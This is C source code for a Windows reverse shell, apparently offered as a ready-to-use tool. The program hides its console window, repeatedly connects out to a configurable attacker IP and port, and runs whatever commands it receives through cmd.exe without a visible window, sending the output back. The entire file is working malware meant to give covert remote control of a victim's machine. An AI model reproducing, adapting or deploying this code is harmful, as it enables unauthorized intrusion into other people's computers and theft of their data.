#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <direct.h>
#include <dirent.h>

#define IP "192.168.100.215" // Change to your IP
#define PORT 4444            // Change to your port

// Hide the console window
void hide_console() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

// Send a directory listing using native APIs
void list_directory(SOCKET sock) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;
    char buffer[1024];

    hFind = FindFirstFile("*", &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        send(sock, "Failed to list directory\n", 25, 0);
        return;
    }

    do {
        snprintf(buffer, sizeof(buffer), "%s\n", findFileData.cFileName);
        send(sock, buffer, strlen(buffer), 0);
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

// Change working directory
void change_directory(const char *path, SOCKET sock) {
    if (_chdir(path) == 0) {
        send(sock, "Directory changed\n", 18, 0);
    } else {
        send(sock, "Failed to change directory\n", 27, 0);
    }
}

// Execute a command using CreateProcess
void execute_command(const char *cmd, SOCKET sock) {
    char buffer[4096];
    char full_cmd[1024];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    SECURITY_ATTRIBUTES sa = {0};
    HANDLE hRead, hWrite;
    DWORD bytesRead;

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    // Create a pipe for the child process's STDOUT and STDERR
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        send(sock, "Failed to create pipe\n", 22, 0);
        return;
    }

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.dwFlags = STARTF_USESTDHANDLES;

    // Construct command string (use cmd.exe for shell commands)
    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /C %s", cmd);

    // Create the process to execute the command with CREATE_NO_WINDOW
    if (!CreateProcess(
            NULL, full_cmd, NULL, NULL, TRUE,
            CREATE_NO_WINDOW, // Prevents creating a visible window
            NULL, NULL, &si, &pi)) {
        send(sock, "Failed to execute command\n", 26, 0);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return;
    }

    CloseHandle(hWrite); // Close write end in parent process

    // Read from the pipe and send output back
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0'; // Null-terminate output
        send(sock, buffer, bytesRead, 0);
    }

    CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}



// Monitor connection and handle commands
void monitor_connection(struct sockaddr_in *server) {
    SOCKET sock;
    char buffer[1024];
    int connected = 0;

    while (1) {
        if (connected) {
            Sleep(3000); // Delay for reconnection
            continue;
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(3000);
            continue;
        }

        if (connect(sock, (struct sockaddr *)server, sizeof(*server)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(3000);
            continue;
        }

        connected = 1;

        while (connected) {
            memset(buffer, 0, sizeof(buffer));
            int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                connected = 0;
                closesocket(sock);
                break;
            }

            buffer[bytes_received] = '\0';

            // Handle "cd" command
            if (strncmp(buffer, "cd ", 3) == 0) {
                char *path = buffer + 3;
                path[strcspn(path, "\n")] = '\0';
                change_directory(path, sock);
                continue;
            }

            // Handle "ls" command
            if (strcmp(buffer, "ls\n") == 0 || strcmp(buffer, "dir\n") == 0) {
                list_directory(sock);
                continue;
            }

            // Handle other commands
            execute_command(buffer, sock);
        }
    }
}

// Main function
int main() {
    WSADATA wsaData;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    hide_console();

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP);

    monitor_connection(&server);

    WSACleanup();
    return 0;
}

